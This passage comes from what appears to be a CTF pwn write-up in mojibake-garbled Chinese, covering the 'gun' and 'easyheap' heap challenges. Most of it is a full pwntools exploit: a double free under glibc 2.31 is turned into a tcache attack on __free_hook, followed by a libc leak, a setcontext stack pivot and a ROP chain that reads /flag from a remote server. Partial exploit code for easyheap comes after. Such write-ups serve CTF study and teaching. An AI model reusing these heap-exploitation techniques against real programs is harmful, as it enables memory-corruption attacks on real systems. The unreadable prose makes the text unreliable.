class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_15F8</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp-18h] [rbp-18h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp-14h] [rbp-14h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp-10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !qword_4050 )</span><br><span class="line">    <span class="keyword">return</span> puts_1(<span class="string">&quot;No bullet!&quot;</span>);</span><br><span class="line">  puts_0(<span class="string">&quot;Shoot time: &quot;</span>);</span><br><span class="line">  v3 = (<span class="type">unsigned</span> <span class="type">int</span>)sub_14E3();</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; qword_4050 &amp;&amp; i &lt; (<span class="type">int</span>)v3; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = *(_QWORD *)qword_4050;</span><br><span class="line">    puts_0(<span class="string">&quot;Pwn! The %s bullet fired.\n&quot;</span>);</span><br><span class="line">    sub_1100(*(_QWORD *)qword_4050, v1);</span><br><span class="line">    v4 = qword_4050;</span><br><span class="line">    qword_4050 = *(_QWORD *)(qword_4050 + <span class="number">8</span>);</span><br><span class="line">    *(_QWORD *)(v4 + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_159A();</span><br><span class="line">  <span class="keyword">return</span> puts_0(<span class="string">&quot;%lld bullets left\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æheapçš„ç»“æ„ä½“ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">container</span>&#123;</span></span><br><span class="line">  <span class="type">void</span> *heap_ptr</span><br><span class="line">  <span class="type">void</span> *next_heap</span><br><span class="line">  <span class="type">int</span> status   <span class="comment">//1ä¸ºå¯ç”¨ï¼Œ2ä¸ºä»¥è£…è½½ï¼Œ3ä¸ºfreeæ‰äº†</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´ç‚¹åœ¨äºloadåä½¿ç”¨next_heapæŒ‡é’ˆå°†loadçš„å †å—è¿æ¥èµ·æ¥ï¼Œä½†shootä¹‹ånext_heapå¹¶ä¸ä¼šæ¸…é™¤ï¼Œè€Œä¸”heap_pträ¹Ÿæœªç½®0ï¼Œåªæ˜¯å°†å…¶freeå¹¶ä¿®æ”¹statusæ”¹ä¸º0ï¼Œä½†ä¹‹åæˆ‘ä»¬å¯ä»¥åªaddå›æ¥ä¸€ä¸ªä½†shootä¸¤ä¸ªï¼Œshootç¬¬äºŒä¸ªæ—¶ä¼šé€šè¿‡next_heapæ‰¾åˆ°é‚£ä¸ªå·²ç»freeçš„å †ï¼Œç”±äºæ²¡æœ‰å¯¹statusçš„æ£€æŸ¥å¯¼è‡´å¯ä»¥äºŒæ¬¡deleï¼Œä½†ç”±äº2.31åŠ å…¥äº†tecacheçš„keyæœºåˆ¶å¯¼è‡´tecache_attackæ— æ³•ä½¿ç”¨ã€‚</p><p>æ„é€ äºŒæ¬¡deleçš„poc:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">load(<span class="number">1</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">2</span>)  <span class="comment">#deleç¬¬äºŒ2ä¸ªæ—¶å¯¼è‡´double free</span></span><br></pre></td></tr></table></figure><p>tecacheçš„double freeæ— æ³•ä½¿ç”¨äº†ï¼Œä½†æ˜¯fastbinçš„å¯ä»¥é¸­ï¼Œå…ˆå¡«æ»¡tecacheï¼Œå†ç”¨ä¸Šé¢çš„æ–¹æ³•åœ¨fastbinæ„é€ double freeï¼Œä¹‹ååœ¨addæ—¶ä¼šå…ˆå–å‡ºtecacheé‡Œçš„binï¼Œå½“tecacheå–å®Œä¹‹åä¼šä»fastbinå–ï¼Œå½“ç¬¬ä¸€æ¬¡ä»fastbinå–æ—¶ï¼Œä¼šæŠŠå‰©ä¸‹çš„fastbinæ”¾å›tecacheï¼Œå› æ­¤æˆ‘ä»¬å°±èƒ½åˆ©ç”¨tecache attackæ‰“åˆ°free_hookã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x70 [  7]: 0x560f03853850 â€”â–¸ 0x560f038533b0 â€”â–¸ 0x560f03853420 â€”â–¸ 0x560f03853490 â€”â–¸ 0x560f03853500 â€”â–¸ 0x560f03853570 â€”â–¸ 0x560f038535e0 â—‚â€” 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x560f03853330 â€”â–¸ 0x560f038532c0 â—‚â€” 0x560f03853330   å…ˆåœ¨fastbin double free</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x560f038536b0 â€”â–¸ 0x7f6f3fdadbe0 (main_arena+96) â—‚â€” 0x560f038536b0</span><br><span class="line">smallbins</span><br></pre></td></tr></table></figure><p>ä¹‹åå–å®Œtecache</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x561bb646c330 â€”â–¸ 0x561bb646c2c0 â—‚â€” 0x561bb646c330</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x561bb646c6b0 â€”â–¸ 0x7fc69a821be0 (main_arena+96) â—‚â€” 0x561bb646c6b0</span><br><span class="line">smallbins</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡å–fastbinæ—¶ï¼ˆä¹Ÿå³æ”¹fdï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x70 [  3]: 0x556f27c2a2d0 â€”â–¸ 0x556f27c2a340 â€”â–¸ 0x7fe4fb1f0b28 (__free_hook) â—‚â€” 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x556f27c2a6b0 â€”â–¸ 0x7fe4fb1edbe0 (main_arena+96) â—‚â€” 0x556f27c2a6b0</span><br><span class="line">smallbins</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ”¾å›tecacheäº†ï¼Œç”±äºæ²¡sizeæ£€æŸ¥ï¼Œå¯ä»¥æ‰“free_hookã€‚</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shoot</span>(<span class="params">time</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(time))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">30772</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p=remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=process(<span class="string">&quot;./gun&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1234&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">load(<span class="number">1</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;e&quot;</span>*<span class="number">8</span>)</span><br><span class="line">libc.address=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ec010</span></span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="keyword">for</span>  i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">load(<span class="number">1</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;f&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x330</span></span><br><span class="line">success(<span class="string">&quot;heap: &quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">load(<span class="number">2</span>)</span><br><span class="line">load(<span class="number">3</span>)</span><br><span class="line">load(<span class="number">4</span>)</span><br><span class="line">load(<span class="number">5</span>)</span><br><span class="line">load(<span class="number">6</span>)</span><br><span class="line">load(<span class="number">7</span>)</span><br><span class="line">load(<span class="number">8</span>)</span><br><span class="line">shoot(<span class="number">7</span>)</span><br><span class="line">load(<span class="number">1</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">load(<span class="number">0</span>)</span><br><span class="line">shoot(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(libc.address+<span class="number">0x0000000000154930</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b free\nc&quot;)</span></span><br><span class="line"></span><br><span class="line">p_rdi=<span class="number">0x0000000000026b72</span>+libc.address</span><br><span class="line">p_rsi=<span class="number">0x0000000000027529</span>+libc.address</span><br><span class="line">p_rdx_r12=<span class="number">0x000000000011c371</span>+libc.address</span><br><span class="line">p_rax=<span class="number">0x000000000004a550</span>+libc.address</span><br><span class="line">syscall_ret=<span class="number">0x0000000000066229</span>+libc.address</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;/flag\x00\x00\x00&quot;</span>+p64(heap_addr+<span class="number">0x6c0</span>)</span><br><span class="line">payload += <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x10</span>+p64(libc.sym[<span class="string">&quot;setcontext&quot;</span>]+<span class="number">61</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">8</span><span class="comment">#offset 0x68</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(heap_addr+<span class="number">0x6c0</span>+<span class="number">0xa8</span>)<span class="comment">#rsi</span></span><br><span class="line">payload += p64(heap_addr+<span class="number">0x2000</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(<span class="number">0x200</span>)*<span class="number">2</span><span class="comment">#rbx and rdx</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(heap_addr+<span class="number">0x6c0</span>+<span class="number">0xa8</span>)<span class="comment"># rsp</span></span><br><span class="line">payload += p64(p_rax)<span class="comment">#rcx</span></span><br><span class="line">payload += p64(p_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">add(<span class="number">0x180</span>,payload)</span><br><span class="line">load(<span class="number">12</span>)</span><br><span class="line">shoot(<span class="number">1</span>)</span><br><span class="line">pause()</span><br><span class="line">rop_chain = [</span><br><span class="line">p_rdi,heap_addr+<span class="number">0x6c0</span>,p_rdx_r12,<span class="number">0</span>,<span class="number">0</span>,p_rsi,<span class="number">0</span>,p_rax,<span class="number">2</span>,syscall_ret,</span><br><span class="line">p_rdi,<span class="number">3</span>,p_rdx_r12,<span class="number">0x100</span>,<span class="number">0</span>,p_rsi,heap_addr+<span class="number">0x2000</span>,p_rax,<span class="number">0</span>,syscall_ret,</span><br><span class="line">p_rdi,<span class="number">1</span>,p_rax,<span class="number">1</span>,syscall_ret</span><br><span class="line">]</span><br><span class="line">p.send(<span class="string">b&quot;A&quot;</span>*<span class="number">0x20</span>+flat(rop_chain))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">main(<span class="string">&quot;123.57.209.176&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h4><p>è¿™é“æ˜¯ruanå¸ˆå‚…åšçš„ï¼Œæˆ‘èµ›åå¤ç°äº†ä¸€ä¸‹</p><p>ç»å…¸èœå•é¢˜ï¼Œæ´åœ¨addé‡Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;size);               <span class="comment">// %hd è¡¨ç¤ºä¸ºçŸ­æ•´å‹2ä¸ªå­—èŠ‚</span></span><br><span class="line">  v2 = size;</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0</span> || size &gt; <span class="number">0x80</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid size.&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;size);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( size &lt;= <span class="number">0</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( size &gt; <span class="number">0x80</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = size;</span><br><span class="line">  &#125;</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Malloc error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memset</span>(ptr, <span class="number">0</span>, size);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  read_n((__int64)ptr, size);                 <span class="comment">// v2æ˜¯ç¬¬ä¸€æ¬¡è¾“å…¥çš„sz</span></span><br><span class="line">  *((_BYTE *)ptr + v2 - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  *((_DWORD *)&amp;unk_4060 + <span class="number">4</span> * i) = size;</span><br><span class="line">  heaplist[<span class="number">2</span> * i] = ptr;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Finish.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œv2æ˜¯ç¬¬ä¸€æ¬¡è¾“å…¥çš„sizeï¼Œå¦‚æœè¿™ä¸ªsizeæ˜¯ä¸ç¬¦åˆæ¡ä»¶çš„ï¼Œå°±èƒ½åœ¨æ‰§è¡Œ<code>*((_BYTE *)ptr + v2 - 1) = 0;</code>æ—¶å‘ä¸Šå†™å…¥ä¸€ä¸ªâ€™\0â€™ï¼Œå¯ä»¥ç”¨æ¥æ”¹binçš„fdï¼Œä»¥æ„é€ overlopã€‚</p><p>leakæ˜¯å…ˆæ„é€ tecache_dupï¼ˆå³ä¸€ä¸ªbinæ—¢åœ¨tecacheï¼Œåˆåœ¨fastbinï¼Œåˆ©ç”¨çš„å°±æ˜¯ä¸Šé¢çš„æ€è·¯ï¼‰é€šè¿‡è§¦å‘malloc_consoildateå°†fastbinæ”¾å…¥unsoretdbinï¼Œä»è€Œleak main_arenaã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10000</span>-<span class="number">0xf0</span>+<span class="number">1</span>))</span><br><span class="line">add_(<span class="number">0x40</span>,<span class="string">&quot;b&quot;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x40</span>,p64(<span class="number">0</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">offset=<span class="number">0x1ebc20</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-offset</span><br></pre></td></tr></table></figure><p>ä¹‹åè¿˜æ˜¯ä¸Šé¢çš„æ€è·¯æ„é€ overlopã€‚é€šè¿‡æ”¹fdçš„ä½å­—èŠ‚ä¸ºâ€™\x00â€™ä½¿å¾—chunk-&gt;fdæŒ‡å‘çš„åœ°å€åœ¨chunkä¸‹é¢ï¼ˆè·ç¦»å°äºchunkçš„sizeï¼‰ï¼Œå¯¼è‡´overlopã€‚</p><p>ä¹‹åtecache attackæ‰“free_hookã€‚</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td 